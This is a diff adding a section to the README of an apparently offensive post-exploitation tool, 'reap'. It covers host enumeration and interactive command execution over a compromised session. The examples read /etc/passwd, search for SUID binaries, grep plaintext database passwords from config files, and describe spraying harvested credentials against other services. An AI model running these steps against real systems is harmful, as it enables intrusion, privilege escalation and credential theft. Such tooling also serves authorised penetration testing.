@@ -155,6 +155,85 @@ reap> register bind 10.10.10.5 1337
 
 Windows `cmd.exe` reverse/bind shell: add `--shell cmd` (e.g. `register listen 4444 --shell cmd`).
 
+## Looking around the box
+
+Once a session is registered you have two ways to work the host by hand, both from the reap prompt over the session you already hold: `enum` to survey it, and `!` / `interact` to run commands on it.
+
+### `enum` — enumeration, linpeas-style
+
+`enum` surveys the active session and prints it to the screen — the situational-awareness dump you'd otherwise shell out for. It covers:
+
+| Category | Collector | What you get |
+|---|---|---|
+| Processes | `processes` | full process list (kernel threads filtered), so you can spot creds on command lines and root-owned processes running out of writable paths |
+| Cron / scheduled jobs | `cron_jobs` | every source: `/etc/crontab`, `/etc/cron.d`, the hourly/daily/weekly/monthly run-parts dirs, per-user crontabs, the spool, and `systemd` timers |
+| Services | `init_services` | running services, enabled-at-boot services, and the SysV/`init.d` fallback |
+| System & network | `system_snapshot` | kernel, distro, uptime, sudo version, `PATH`, logged-in/recent users, interfaces, routes, active connections, ARP, DNS, `/etc/hosts` |
+| Windows | `windows_enum` | services (with logon account + binary path), scheduled tasks, and processes with full command lines |
+
+```
+reap> enum
+──────────────────────────────── Processes ────────────────────────────────
+# look for creds on command lines and root-owned procs from writable paths (auto-captured by 'run')
+root           1 /sbin/init
+postgres     712 postgres: 13/main: writer process
+deploy      1841 node /opt/app/server.js --db-pass hunter2
+www-data    1990 /usr/sbin/apache2 -k start
+─────────────────────────────── systemd timers ────────────────────────────
+NEXT                         LEFT     UNIT                 ACTIVATES
+Tue 2026-07-21 15:39:00 CDT  14min    phpsessionclean.timer phpsessionclean.service
+...
+```
+
+Narrow it to one area by passing a filter that matches a collector name:
+
+```
+reap> enum cron        # just the cron sources
+reap> enum proc        # just processes
+reap> enum system      # kernel, users, and the network sections (system_snapshot)
+```
+
+**`enum` is screen-only — nothing it prints is written to the loot store**, so it never clutters `findings`. The point is to read the room. Looting the room is `run`'s job: the same collectors, run as part of `run`, quietly persist only the **actionable** subset as ranked findings —
+
+- a secret on a process / cron / service command line → a **credential** (and it's fed straight into correlation);
+- a **writable** `systemd` unit file, a writable binary named in an `ExecStart=`, or a writable file a cron job executes → a **high** misconfig (classic privesc);
+- an unquoted Windows service path with a space → a **medium** misconfig.
+
+So in the sample above, `enum` just shows you the `deploy` process; `run` turns that `--db-pass hunter2` into a stored credential that correlation then sprays against every service it knows about.
+
+Unlike the opt-in LinPEAS/WinPEAS wrappers, `enum` needs **nothing on disk** — no binary to upload, drop, or clean up. It runs over the same `exec` channel as everything else, so it works identically over SSH, WinRM, a webshell, or a caught raw shell.
+
+### `!<cmd>` and `interact` — a shell on the target
+
+You're shelled into the box; sometimes you just want to `ls`, `cd`, and `cat` around without leaving reap. Two ways:
+
+**One-off** — prefix any command with `!` (or `shell`). It runs on the active session and prints the output:
+
+```
+reap> !id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+reap> !cat /etc/passwd
+reap> !find / -perm -4000 -type f 2>/dev/null
+```
+
+**Interactive** — `interact` drops you into a remote prompt where you type commands normally until you `exit` (or press Ctrl-D):
+
+```
+reap> interact
+interacting with ssh:bob@10.10.10.5:22 — 'exit' or Ctrl-D returns to reap. (line-based; no PTY)
+10.10.10.5:~$ cd /var/www/html
+10.10.10.5:/var/www/html$ ls
+config.php  index.php  uploads
+10.10.10.5:/var/www/html$ grep -i pass config.php
+$db_pass = 'S3cr3tDBpw!';
+10.10.10.5:/var/www/html$ exit
+reap>
+```
+
+Notice the prompt tracked the directory across commands. reap keeps a **virtual working directory per session**, so `cd` persists — even over SSH, whose `exec` channel is otherwise a fresh shell on every command (a naive `cd` would be forgotten the moment it returned). A `cd` into a directory that doesn't exist is rejected and leaves your current directory unchanged. The same cwd is shared by `!` one-offs and `interact`.
+
+It's **line-based, with no PTY**: send-a-command, read-the-output. Programs that need a terminal — `top`, `vi`/`nano`, an interactive `sudo` password prompt, `ssh` — won't work. For those, stabilize the shell in pwncat-vl and drop your key. Everything that runs and returns (the 99% you actually use for looking around) works fine. Type an unknown command at the `reap>` prompt and it'll remind you to prefix it with `!` or use `interact`.
+
 ## Commands
 
 | command | description |
